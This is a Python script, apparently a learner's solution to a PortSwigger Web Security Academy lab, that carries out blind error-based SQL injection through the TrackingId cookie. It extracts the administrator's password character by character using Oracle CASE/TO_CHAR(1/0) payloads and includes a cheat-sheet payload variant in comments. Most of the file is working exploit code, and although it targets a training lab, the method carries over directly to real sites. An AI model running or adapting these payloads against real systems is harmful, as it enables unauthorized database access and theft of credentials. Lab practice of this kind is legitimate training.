import requests

session = requests.session()

burp0_url = "https://ace21fb31f898683c0e02a41005900db.web-security-academy.net:443/filter?category=Food+%26+Drink"
burp0_cookies = {"TrackingId": "ngGEqut6l5jo5Wpf'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'", "session": "StjHCzapM8IaREiS92pLIQycOzwq0yBZ"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://ace21fb31f898683c0e02a41005900db.web-security-academy.net/filter?category=Pets", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
# session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)



# ######################  until here burp paste of request for python  ########################## #
# code by amotz for:
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

url = burp0_url
cookies = burp0_cookies
headers = burp0_headers
char_list = "abcdefghijklmnopqrstuvwxyz1234567890"

def send_request_for_char():
    trackingId = burp0_cookies["TrackingId"]
    loaded_cookies = burp0_cookies
    response = requests.get(url, headers=headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
    # print(response.status_code, len(response.content))
    click = (response.status_code)
    password = ""
    pass_index = 1
    ting = False

    # payload lab before= f"'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+{pass_index},+1)+=+'{i}"
    # " oracle:	                 SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual "
    # cheetsheet  ' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

    while not ting:
        for i in char_list:
            # print(i)
            payload = f"'||(SELECT CASE WHEN SUBSTR(password,{pass_index},1)='{i}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
            loaded_cookies["TrackingId"] = trackingId + payload
            print(loaded_cookies["TrackingId"])
            response = requests.get(url, headers=headers, cookies=loaded_cookies, proxies={"http": "http://127.0.0.1:8080"})
            print(response.status_code, len(response.content))
            if response.status_code != 200:
                password += i
                print(f"partial password is {password}")
                pass_index += 1
                break
            elif i == char_list[-1] and password != "":
                ting = True
                print(f"TING! password is ready!\n\npassword for username 'administrator' is:\n{password}\nuse it wisely")
                break
            elif i == char_list[-1] and password =="":
                print(f"sorry but no success pls check ingridiants:{char_list}")
                ting = True
                break

if __name__ == '__main__':
    send_request_for_char()

